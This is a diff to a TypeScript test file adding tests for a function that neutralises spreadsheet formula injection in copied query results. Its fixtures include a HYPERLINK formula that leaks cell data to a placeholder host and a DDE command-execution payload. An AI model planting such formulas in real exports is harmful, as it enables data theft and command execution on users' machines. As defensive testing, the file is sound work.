@@ -1,5 +1,5 @@
 import { describe, expect, it } from "vitest";
-import { cellText, columnToText, copyColumnsFor, rowsToTsv, tsvField, type CopyColumn } from "./copyResults";
+import { cellText, columnToText, copyColumnsFor, rowsToTsv, spreadsheetSafe, tsvField, type CopyColumn } from "./copyResults";
 
 const FV = "@OData.Community.Display.V1.FormattedValue";
 const GUID = "11111111-1111-1111-1111-111111111111";
@@ -100,5 +100,61 @@ describe("columnToText", () => {
 	it("writes one value per line, without a header", () => {
 		expect(columnToText(rows, contact, "raw")).toBe(`${GUID}\n`);
 		expect(columnToText(rows, name)).toBe('Contoso\n"Fabrikam ""Retail"""');
+	});
+});
+
+describe("spreadsheet formulas in copied rows (#208)", () => {
+	const formulaRows: Record<string, unknown>[] = [
+		{ name: '=HYPERLINK("https://example.invalid/?d="&A2,"Click")', revenue: -5, [`revenue${FV}`]: "-$5.00", description: "@SUM(A1:A2)" },
+		{ name: "+cmd|' /C calc'!A0", revenue: 3, description: "-2+3" },
+		{ name: "\tindented", revenue: null, description: "plain text" },
+	];
+
+	it("puts an apostrophe before text starting with =, +, -, @ or a tab", () => {
+		expect(spreadsheetSafe("=1+1")).toBe("'=1+1");
+		expect(spreadsheetSafe("+1")).toBe("'+1");
+		expect(spreadsheetSafe("-2+3")).toBe("'-2+3");
+		expect(spreadsheetSafe("@SUM(A1)")).toBe("'@SUM(A1)");
+		expect(spreadsheetSafe("\tx")).toBe("'\tx");
+		expect(spreadsheetSafe("\rx")).toBe("'\rx");
+		expect(spreadsheetSafe("Contoso")).toBe("Contoso");
+		expect(spreadsheetSafe("a=b")).toBe("a=b");
+		expect(spreadsheetSafe("")).toBe("");
+	});
+
+	it("leaves a number's sign alone, but not a formula shown for a numeric value", () => {
+		expect(spreadsheetSafe("-5", -5)).toBe("-5");
+		expect(spreadsheetSafe("-$5.00", -5)).toBe("-$5.00");
+		expect(spreadsheetSafe("-1,234.50", -1234.5)).toBe("-1,234.50");
+		expect(spreadsheetSafe("-5,00 kr", -5)).toBe("-5,00 kr");
+		expect(spreadsheetSafe("-€ 5,00", -5)).toBe("-€ 5,00");
+		expect(spreadsheetSafe("+1", 1)).toBe("+1");
+		// A choice label is shown for a numeric raw value, and a label can start with =, + or -
+		expect(spreadsheetSafe("=Other", 3)).toBe("'=Other");
+		expect(spreadsheetSafe('+HYPERLINK("http://x")', 3)).toBe(`'+HYPERLINK("http://x")`);
+		expect(spreadsheetSafe("-Other", 3)).toBe("'-Other");
+		expect(spreadsheetSafe("-2+3", 1)).toBe("'-2+3");
+		// A text column's "-5" is text: Excel would still read it as a formula input
+		expect(spreadsheetSafe("-5", "-5")).toBe("'-5");
+	});
+
+	it("neutralises copied rows, as shown and raw", () => {
+		const shown = rowsToTsv(formulaRows, [name, revenue, description]).split("\n");
+		expect(shown[1]).toBe(`"'=HYPERLINK(""https://example.invalid/?d=""&A2,""Click"")"\t-$5.00\t'@SUM(A1:A2)`);
+		expect(shown[2]).toBe("'+cmd|' /C calc'!A0\t3\t'-2+3");
+		expect(shown[3]).toBe("\"'\tindented\"\t\tplain text");
+		expect(rowsToTsv(formulaRows, [revenue], "raw").split("\n")[1]).toBe("-5");
+	});
+
+	it("copies a column exactly, for pasting into an in condition", () => {
+		expect(columnToText(formulaRows, description)).toBe("@SUM(A1:A2)\n-2+3\nplain text");
+	});
+
+	it("neutralises a header too", () => {
+		expect(rowsToTsv([], [col("x", "=cmd")])).toBe("'=cmd");
+	});
+
+	it("copies a single cell exactly as shown", () => {
+		expect(cellText(formulaRows[0], description)).toBe("@SUM(A1:A2)");
 	});
 });
